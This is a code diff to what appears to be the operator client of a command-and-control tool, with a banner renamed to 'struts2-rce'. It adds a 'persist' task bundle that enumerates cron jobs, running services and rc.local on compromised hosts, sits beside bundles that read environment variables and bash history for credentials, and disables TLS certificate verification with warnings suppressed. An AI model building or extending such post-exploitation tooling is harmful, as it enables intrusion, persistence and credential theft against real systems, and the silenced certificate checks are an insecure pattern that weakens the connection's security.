@@ -47,6 +47,13 @@ BUNDLES: dict[str, list[dict]] = {
         {"title": "Find writable dirs", "task_type": "execute", "command": "find / -writable -type d 2>/dev/null"},
         {"title": "Find txt files",     "task_type": "execute", "command": "find /home -name '*.txt' 2>/dev/null"},
     ],
+    "persist": [
+        {"title": "Crontabs",           "task_type": "execute", "command": "cat /etc/crontab"},
+        {"title": "User crontab",       "task_type": "execute", "command": "crontab -l"},
+        {"title": "Cron directories",   "task_type": "execute", "command": "ls -la /etc/cron*"},
+        {"title": "Enabled services",   "task_type": "execute", "command": "systemctl list-units --type=service --state=running"},
+        {"title": "RC local",           "task_type": "execute", "command": "cat /etc/rc.local"},
+    ],
     "cred": [
         {"title": "Environment vars",   "task_type": "execute", "command": "env"},
         {"title": "Bash history",       "task_type": "execute", "command": "cat ~/.bash_history"},
@@ -128,7 +135,7 @@ BANNER = r"""
  ██║     ██╔═══╝     ██║     ██║     ██║
  ╚██████╗███████╗    ╚██████╗███████╗██║
   ╚═════╝╚══════╝     ╚═════╝╚══════╝╚═╝
-   Operator CLI  ·  Listening Post Edition
+   Operator CLI  ·  struts2-rce
 """
 
 HELP_TEXT = f"""
@@ -149,10 +156,12 @@ class LPClient:
         if host.startswith("http://") or host.startswith("https://"):
             self.base_url = f"{host.rstrip('/')}:{port}"
         else:
-            self.base_url = f"http://{host}:{port}"
+            self.base_url = f"https://{host}:{port}"
         self.timeout = timeout
         self._s = requests.Session()
         self._s.headers.update({"Content-Type": "application/json"})
+        self._s.verify = False
+        requests.packages.urllib3.disable_warnings()
 
     def _get(self, endpoint: str):
         r = self._s.get(f"{self.base_url}{endpoint}", timeout=self.timeout)
